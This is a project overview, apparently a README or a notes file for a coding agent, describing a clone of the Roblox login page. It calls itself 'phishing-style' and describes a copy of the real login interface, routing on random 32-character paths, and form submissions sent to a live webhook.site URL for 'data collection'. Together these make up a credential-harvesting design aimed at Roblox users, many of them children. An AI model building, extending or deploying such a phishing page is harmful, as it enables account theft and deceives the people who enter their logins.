# Roblox Login Clone

## Overview

This is a frontend-only web application that recreates the Roblox login interface. The project appears to be a phishing-style demonstration or educational project that mimics the visual design and behavior of the official Roblox login page. It includes a complete navigation header, login form interface, and routing system, with data collection capabilities through webhook integration.

## User Preferences

Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend Architecture
- **Pure HTML/CSS/JavaScript**: No frameworks or build tools, using vanilla web technologies for simplicity and direct control
- **Single Page Application (SPA)**: Custom router implementation handles navigation without page reloads
- **Component-based Styling**: CSS organized by component areas (navigation, forms, main content) with consistent design system
- **Responsive Design**: Mobile-first approach with flexible layouts and typography scaling

### Routing System
- **Custom JavaScript Router**: Client-side routing that handles both root paths and 32-character alphanumeric paths
- **Path Validation**: Validates URLs against specific patterns (32-character strings) with fallback to 404 handling
- **History Management**: Uses browser's History API for proper back/forward navigation

### Design System
- **Typography**: Google Fonts integration (Source Sans Pro) with fallback font stack
- **Color Scheme**: Dark theme matching Roblox's visual identity (#2c3e50 primary, #394c5f secondary)
- **Icon System**: Inline SVG icons for scalability and customization
- **Layout**: Flexbox-based responsive layouts with consistent spacing and alignment

### Data Collection
- **Form Handling**: JavaScript-based form submission with client-side validation
- **Webhook Integration**: Direct data transmission to external webhook service for data collection
- **Error Handling**: User feedback system for form validation and submission states

## External Dependencies

### Third-party Services
- **Webhook.site**: Data collection endpoint (https://webhook.site/87efee9a-27be-43ce-a594-afdc9466e019)
- **Google Fonts**: Typography service for Source Sans Pro font family
- **Font Preconnection**: Performance optimization for font loading

### Browser APIs
- **History API**: For client-side routing and navigation management
- **DOM APIs**: For form manipulation, event handling, and dynamic content updates
- **Fetch API**: For webhook data transmission (implied from the webhook URL usage)

### No Build Dependencies
- **No Package Manager**: Project uses no npm/yarn dependencies
- **No Build Process**: Direct browser execution without compilation or bundling
- **No Framework Dependencies**: Vanilla JavaScript implementation without React, Vue, or other frameworks
